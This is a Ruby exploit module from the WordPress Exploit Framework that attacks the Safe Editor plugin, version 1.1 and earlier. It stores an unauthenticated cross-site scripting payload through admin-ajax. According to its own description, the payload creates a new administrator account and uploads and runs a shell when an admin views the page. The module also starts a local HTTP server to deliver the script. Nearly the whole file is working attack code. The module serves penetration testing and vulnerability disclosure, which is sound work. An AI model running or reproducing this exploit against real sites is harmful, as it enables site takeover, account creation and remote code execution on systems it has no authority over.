# frozen_string_literal: true

class Wpxf::Exploit::SafeEditorXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::Xss

  def initialize
    super

    update_info(
      name: 'Safe Editor <= 1.1 XSS Shell Upload',
      desc: 'This module exploits a lack of user level validation and input '\
            'sanitization in versions <= 1.1 of the Safe Editor '\
            'plugin which allows unauthenticated users to store '\
            'a script that will create a new admin user and use the new '\
            'credentials to upload and execute a payload when an admin '\
            'views the page.',
      author: [
        '@robsat91', # Disclosure
        'rastating'  # WPXF module
      ],
      references: [
        ['WPVDB', '8497']
      ],
      date: 'May 17 2016'
    )
  end

  def check
    check_plugin_version_from_changelog('safe-editor', 'readme.txt', '1.2')
  end

  def run
    return false unless super

    emit_info 'Storing script...'
    res = execute_post_request(
      url: wordpress_url_admin_ajax,
      body: {
        'action' => 'se_save',
        'type' => 'js',
        'data' => xss_ascii_encoded_include_script
      }
    )

    if res.nil?
      emit_error 'No response from the target'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    emit_success 'Script stored and will be executed when a user views a page'
    start_http_server

    xss_shell_success
  end
end
